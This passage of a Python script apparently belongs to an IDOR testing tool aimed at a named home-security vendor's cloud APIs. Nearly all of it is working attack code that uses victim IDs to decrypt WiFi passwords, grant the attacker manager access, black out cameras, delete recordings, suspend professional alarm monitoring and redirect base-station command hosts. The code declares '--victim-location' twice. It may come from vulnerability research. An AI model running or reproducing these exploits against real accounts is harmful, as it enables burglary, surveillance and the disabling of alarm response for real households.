    attacker_pub_bytes = attacker_priv.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)
    attacker_pub_b64 = base64.b64encode(attacker_pub_bytes).decode()
    salt_bytes = os.urandom(32)
    salt_b64 = base64.b64encode(salt_bytes).decode()
    body = {"publicKey": attacker_pub_b64, "salt": salt_b64}
    r = get(f"{SERVICES['app_hub']}/v1/ss3/{victim_serial}/{victim_sid}/wifiCredentials",
            token=token, json=body)
    if not r:
        print("  Request failed"); return
    if r.status_code == 200:
        try:
            data = r.json()
            server_pub_b64 = data.get("publicKey", "")
            sc = data.get("secureContainer", {})
            nonce_b64 = sc.get("nonce", "")
            tag_b64 = sc.get("tag", "")
            ct_b64 = sc.get("ciphertext", "")
            if server_pub_b64 and ct_b64:
                # Derive shared key: HKDF-SHA256(X25519(attacker_priv, server_pub), salt, sid_bytes)
                from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PublicKey
                server_pub_bytes = base64.b64decode(server_pub_b64)
                server_pub = X25519PublicKey.from_public_bytes(server_pub_bytes)
                shared = attacker_priv.exchange(server_pub)
                sid_bytes = victim_sid.encode() if isinstance(victim_sid, str) else str(victim_sid).encode()
                derived_key = HKDF(algorithm=hashes.SHA256(), length=32,
                                   salt=salt_bytes, info=sid_bytes).derive(shared)
                # Decrypt AES-GCM
                nonce = base64.b64decode(nonce_b64)
                ciphertext_plus_tag = base64.b64decode(ct_b64) + base64.b64decode(tag_b64)
                try:
                    aead = AESGCM(derived_key)
                    plaintext = aead.decrypt(nonce, ciphertext_plus_tag, None)
                    _print("CRIT", 200, f"WiFi PSK DECRYPTED serial={victim_serial}: {plaintext}")
                except Exception as dec_err:
                    _print("CRIT", 200,
                           f"200+secureContainer (decrypt failed: {dec_err}) — server_pub={server_pub_b64[:20]}...")
            else:
                _print("CRIT", 200, f"200 raw={r.text[:200]}")
        except Exception as e:
            _print("CRIT", 200, f"200 (parse err: {e}) raw={r.text[:200]}")
    else:
        _print("INFO", r.status_code, f"wifiCredentials: {r.text[:100]}")


def test_location_grant_idor(token, victim_location_id, probe_email="idor-probe@example.invalid"):
    """F39: Read grant authorizations for victim location + attempt self-grant as MANAGER."""
    print(f"\n=== F39 — Location Grant Authorization IDOR (locationId={victim_location_id}) ===")
    # Step 1: read who has access
    r = get(f"{SERVICES['location_auth']}/locations/{victim_location_id}", token=token)
    if r and r.status_code == 200:
        _print("CRIT", 200, f"GRANT LIST locationId={victim_location_id}: {r.text[:300]}")
    else:
        _print("INFO", r.status_code if r else 0,
               f"grant list: {r.text[:80] if r else 'no response'}")
    # Step 2: attempt self-grant (uses probe@example.invalid — does NOT send real email)
    body = {"granteeName": "IDOR-Probe", "granteeEmail": probe_email, "role": "MANAGER"}
    r2 = post(f"{SERVICES['location_auth']}/locations/{victim_location_id}", token=token, json=body)
    if not r2:
        print("  POST failed"); return
    if r2.status_code in (200, 201):
        _print("CRIT", r2.status_code,
               f"GRANT CREATED locationId={victim_location_id} -> {probe_email} MANAGER: {r2.text[:200]}")
    else:
        _print("INFO", r2.status_code, f"grant create: {r2.text[:100]}")


def test_camera_settings_idor(token, victim_sid, victim_camera_uuid=None):
    """F38: Enumerate cameras via sid IDOR + enable privacy mode (blackout) on victim camera."""
    print(f"\n=== F38 — Camera Settings IDOR (sid={victim_sid}) ===")
    # Step 1: enumerate cameras to get UUID
    r = get(f"{SERVICES['app_hub']}/v1/subscriptions/{victim_sid}/cameras", token=token)
    uuids = []
    if r and r.status_code == 200:
        try:
            data = r.json()
            cams = data if isinstance(data, list) else data.get("cameras", []) or data.get("items", [])
            for c in cams:
                uuid = c.get("uuid") or c.get("id")
                uuids.append(uuid)
                _print("CRIT", 200,
                       f"CAMERA ENUM sid={victim_sid} uuid={uuid} name={c.get('cameraName',c.get('name','?'))}")
        except Exception as e:
            _print("CRIT", 200, f"200 (parse err: {e}) raw={r.text[:200]}")
    else:
        _print("INFO", r.status_code if r else 0,
               f"cameras/{victim_sid}: {r.text[:80] if r else 'no response'}")
    target_uuid = victim_camera_uuid or (uuids[0] if uuids else None)
    if not target_uuid:
        print("  No UUID to test settings write"); return
    # Step 2: enable privacy mode
    r2 = get(f"{SERVICES['app_hub']}/v1/cameras/{target_uuid}", token=token)
    if r2 and r2.status_code == 200:
        _print("CRIT", 200, f"CAMERA GET uuid={target_uuid} settings={r2.text[:200]}")
    r3 = patch(f"{SERVICES['app_hub']}/v1/cameras/{target_uuid}/settings",
               token=token, json={"privacyEnable": True})
    if r3 and r3.status_code in (200, 201, 204):
        _print("CRIT", r3.status_code, f"PRIVACY MODE ENABLED uuid={target_uuid}")
    elif r3:
        _print("INFO", r3.status_code, f"settings patch: {r3.text[:100]}")


def test_recording_deletion_idor(token, victim_clip_id):
    """F37: Delete victim's recording by clipId IDOR."""
    print(f"\n=== F37 — Recording Deletion IDOR (clipId={victim_clip_id}) ===")
    r_list = get(f"{SERVICES['app_hub']}/v1/recordings", token=token)
    if r_list and r_list.status_code == 200:
        try:
            clips = r_list.json()
            own_ids = [c.get("clipId") or c.get("id") for c in (clips if isinstance(clips, list)
                       else clips.get("clips", []))][:3]
            _print("INFO", 200, f"Own clip IDs (for enumeration comparison): {own_ids}")
        except Exception:
            pass
    import requests as req_lib
    headers = {"Authorization": f"Bearer {token}"}
    r = req_lib.delete(f"{SERVICES['app_hub']}/v1/recordings/{victim_clip_id}", headers=headers)
    if r.status_code in (200, 204):
        _print("CRIT", r.status_code, f"RECORDING DELETED clipId={victim_clip_id}")
    elif r.status_code == 404:
        _print("INFO", 404, f"Not found — clipId may belong to different namespace or not exist")
    else:
        _print("INFO", r.status_code, f"recording delete: {r.text[:100]}")


def test_wifi_psk_settings_idor(token, victim_sid, probe_ssid="ablation-probe", probe_pw="ABLATION-PROBE-DO-NOT-CONNECT"):
    """F42: Read WiFi PSK from cloud normal settings + attempt write (requires auth to verify masking)."""
    print(f"\n=== F42 — WiFi PSK Settings IDOR (sid={victim_sid}) ===")
    for stype in ["normal", "all"]:
        r = get(f"{SERVICES['yoda']}/ss3/subscriptions/{victim_sid}/settings?settingsType={stype}",
                token=token)
        if r and r.status_code == 200:
            try:
                data = r.json()
                norm = (data.get("settings", {}).get("normal")
                        or data.get("normal")
                        or {})
                ssid = norm.get("wifiSSID")
                pw = norm.get("wifiPassword")
                if pw and pw not in ("", None, "***", "****"):
                    _print("CRIT", 200,
                           f"WIFI PSK EXPOSED settingsType={stype} sid={victim_sid}: "
                           f"ssid={ssid} password={pw}")
                else:
                    _print("INFO", 200,
                           f"settingsType={stype}: ssid={ssid} password={pw!r} (masked or null)")
            except Exception as e:
                _print("INFO", 200, f"parse err: {e} raw={r.text[:100]}")
        else:
            _print("INFO", r.status_code if r else 0, f"settingsType={stype}: {r.text[:60] if r else 'no response'}")


def test_monitoring_suspension_idor(token, victim_location_id):
    """F40: Enable practice mode on victim's monitoring — suspends professional dispatch during real alarms."""
    print(f"\n=== F40 — Professional Monitoring Suspension IDOR (locationId={victim_location_id}) ===")
    base = f"{SERVICES['app_hub']}/monitoring"
    r = get(f"{base}/v1/locations/{victim_location_id}/monitoring", token=token)
    if r and r.status_code == 200:
        _print("CRIT", 200, f"MONITORING READ locationId={victim_location_id}: {r.text[:200]}")
    else:
        _print("INFO", r.status_code if r else 0,
               f"monitoring get: {r.text[:80] if r else 'no response'}")
    body = {"serviceStatus": {"practiceMode": {"isEnabled": True, "endTimestamp": "2099-12-31T23:59:59Z"}}}
    r2 = patch(f"{base}/v1/locations/{victim_location_id}/monitoring", token=token, json=body)
    if not r2:
        print("  PATCH failed"); return
    if r2.status_code in (200, 201, 204):
        _print("CRIT", r2.status_code,
               f"PRACTICE MODE ENABLED locationId={victim_location_id} — monitoring dispatch suspended")
        r3 = get(f"{base}/v1/locations/{victim_location_id}/monitoring", token=token)
        if r3 and r3.status_code == 200:
            _print("CRIT", 200, f"CONFIRMED state: {r3.text[:200]}")
    else:
        _print("INFO", r2.status_code, f"monitoring patch: {r2.text[:100]}")


def test_c2_redirect_idor(token, victim_sid, probe_host="probe.ablation-test.invalid"):
    """F41: Read obiwanA/B from cloud admin settings + attempt C2 hostname redirect on victim SID."""
    print(f"\n=== F41 — Base Station C2 Redirect IDOR (sid={victim_sid}) ===")
    r = get(f"{SERVICES['yoda']}/ss3/subscriptions/{victim_sid}/settings?settingsType=SYSTEM",
            token=token)
    if r and r.status_code == 200:
        try:
            data = r.json()
            admin = data.get("settings", {}).get("admin", data.get("admin", {}))
            obia = admin.get("obiwanA")
            obib = admin.get("obiwanB")
            _print("CRIT", 200, f"C2 HOSTS EXPOSED sid={victim_sid}: obiwanA={obia} obiwanB={obib}")
        except Exception as e:
            _print("CRIT", 200, f"200 (parse err: {e}) raw={r.text[:200]}")
    else:
        _print("INFO", r.status_code if r else 0,
               f"settings read: {r.text[:80] if r else 'no response'}")
    body = {"settings": {"admin": {"obiwanA": probe_host, "obiwanB": probe_host}}}
    r2 = post(f"{SERVICES['yoda']}/ss3/subscriptions/{victim_sid}/settings",
              token=token, json=body)
    if not r2:
        print("  POST failed"); return
    if r2.status_code in (200, 201, 204):
        _print("CRIT", r2.status_code,
               f"C2 REDIRECT ACCEPTED sid={victim_sid} -> {probe_host}")
    else:
        _print("INFO", r2.status_code, f"settings write: {r2.text[:100]}")


def test_webrtc_idor(token, victim_camera_uuid, victim_sid):
    """F18: WebRTC live view session hijack — get LiveKit JWT + AWS KVS creds for victim camera."""
    print(f"\n=== F18 — WebRTC Live View IDOR (uuid={victim_camera_uuid}, sid={victim_sid}) ===")
    r = get(f"{SERVICES['app_hub']}/v2/cameras/{victim_camera_uuid}/{victim_sid}/live-view",
            token=token)
    if r:
        if r.status_code == 200:
            data = r.json()
            lk = data.get("liveKitDetails", {})
            _print("CRIT", 200, f"LiveKit URL={lk.get('liveKitURL')} token_len={len(lk.get('userToken',''))}")
            _print("CRIT", 200, f"channelARN={data.get('channelARN','')[:60]}")
            ice = data.get("iceServers", [{}])
            if ice:
                _print("CRIT", 200, f"TURN creds: user={ice[0].get('username','')[:20]} urls={ice[0].get('urls','')}")
        else:
            _print("INFO", r.status_code, r.text[:100])


# ─── Own Account Enumeration ────────────────────────────────────────────────────

def enum_own_account(token, uid, sid):
    """Enumerate own account to get resource IDs needed for IDOR tests."""
    print(f"\n=== Own Account Enum (uid={uid}, sid={sid}) ===")

    # Get locations
    r = get(f"{SERVICES['yoda']}/accounts/{uid}/locations", token=token)
    if r and r.status_code == 200:
        data = r.json()
        _print("OK", 200, f"locations: {json.dumps(data)[:200]}")

    # Get sensors
    r = get(f"{SERVICES['yoda']}/ss3/subscriptions/{sid}/sensors", token=token)
    if r and r.status_code == 200:
        _print("OK", 200, f"sensors: {r.text[:200]}")

    # Get cameras
    r = get(f"{SERVICES['yoda']}/subscriptions/{sid}/cameras", token=token)
    if r and r.status_code == 200:
        _print("OK", 200, f"cameras: {r.text[:200]}")

    # Get own camera provisioning token (to see format)
    r = post(f"{SERVICES['yoda']}/cameras/provisioningToken",
             token=token, body={"sid": str(sid)})
    if r and r.status_code == 200:
        data = r.json()
        _print("OK", 200, f"camera token format: {list(data.keys())} expires_in={data.get('expires_in')}")

    # Get grant authorizations
    r = get(f"{SERVICES['location_auth']}/locations/{sid}", token=token)
    if r:
        _print("OK" if r.status_code == 200 else "INFO", r.status_code,
               f"location grants: {r.text[:150]}")

    # PCS: own cameras
    r = get(f"{SERVICES['pcs']}/camera/getall/user/{uid}", token=token)
    if r and r.status_code == 200:
        _print("OK", 200, f"PCS cameras: {r.text[:150]}")

    # Get own signed video URL (reveals format for /video-signed/)
    r = get(f"{SERVICES['pcs']}/video/sign?user_id={uid}&file_path=test.mp4", token=token)
    if r:
        _print("OK" if r.status_code == 200 else "INFO", r.status_code,
               f"video/sign: {r.text[:150]}")


# ─── Main ───────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="SimpliSafe RE + IDOR Verification")
    parser.add_argument("--token", help="Bearer auth token")
    parser.add_argument("--uid", help="Own user ID (numeric)")
    parser.add_argument("--sid", help="Own subscription/location ID (numeric)")
    parser.add_argument("--unauth", action="store_true", help="Run unauthenticated probes only")
    parser.add_argument("--idor", action="store_true", help="Run IDOR test suite (requires victim params)")
    parser.add_argument("--enum", action="store_true", help="Enumerate own account")
    parser.add_argument("--victim-sid", help="Victim subscription ID for IDOR tests")
    parser.add_argument("--victim-uid", help="Victim user ID for IDOR tests")
    parser.add_argument("--victim-email", help="Victim email for revoke IDOR tests")
    parser.add_argument("--victim-location", help="Victim location ID for grant IDOR tests")
    parser.add_argument("--victim-camera-uuid", help="Victim camera UUID for stream/WebRTC IDOR")
    parser.add_argument("--victim-grantee-id", help="Victim grantee ID for F1 test")
    parser.add_argument("--victim-serial", help="Victim base station serial for sensor data IDOR")
    parser.add_argument("--victim-location", help="Victim location ID for grant/comm IDOR tests")
    parser.add_argument("--victim-device-id", help="Own mobile device ID for comm IDOR")
    parser.add_argument("--enum-emails", nargs="+", help="Emails to check via F19 oracle")
    args = parser.parse_args()

    if args.unauth:
        probe_unauth()

    if args.enum_emails:
        probe_email_oracle(args.enum_emails)

    if args.enum and args.token and args.uid and args.sid:
        enum_own_account(args.token, args.uid, args.sid)

    if args.idor:
        if not args.token:
            print("--idor requires --token")
            sys.exit(1)

        if args.victim_sid:
            test_alarm_state_idor(args.token, args.sid, args.victim_sid)
            test_camera_token_idor(args.token, args.victim_sid)
            test_sensor_enum(args.token, args.victim_sid)
            test_face_idor(args.token, args.victim_sid)

        if args.victim_uid:
            test_alarm_state_read(args.token, args.victim_uid)
            test_location_enum(args.token, args.victim_uid)

        if args.victim_grantee_id:
            test_grant_auth_idor(args.token, args.victim_grantee_id)

        if args.victim_location and args.victim_email:
            test_grant_revoke_idor(args.token, args.victim_location, args.victim_email)

        if args.victim_uid and hasattr(args, "victim_device"):
            test_push_notif_idor(args.token, args.victim_uid, args.victim_device)

        if args.victim_camera_uuid and args.victim_sid:
            test_camera_stream_idor(args.token, args.victim_camera_uuid)
            test_webrtc_idor(args.token, args.victim_camera_uuid, args.victim_sid)
        elif args.victim_camera_uuid:
            test_camera_stream_idor(args.token, args.victim_camera_uuid)

        if args.victim_uid and args.victim_location and args.victim_device_id:
            test_communications_idor(args.token, args.victim_uid, args.victim_location,
                                     args.victim_device_id)

        if args.victim_serial and args.victim_location:
            test_sensor_data_idor(args.token, args.victim_serial, args.victim_location)

    # Print findings summary
    print("\n=== Findings Summary ===")
    for f in sorted(FINDINGS, key=lambda x: {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}.get(x.severity, 9)):
        status = "VERIFIED" if f.verified else "UNVERIFIED"
        print(f"  [{f.severity:8}] [{status}] {f.id}: {f.title}")
        if f.evidence:
            print(f"             {f.evidence}")


if __name__ == "__main__":
    main()
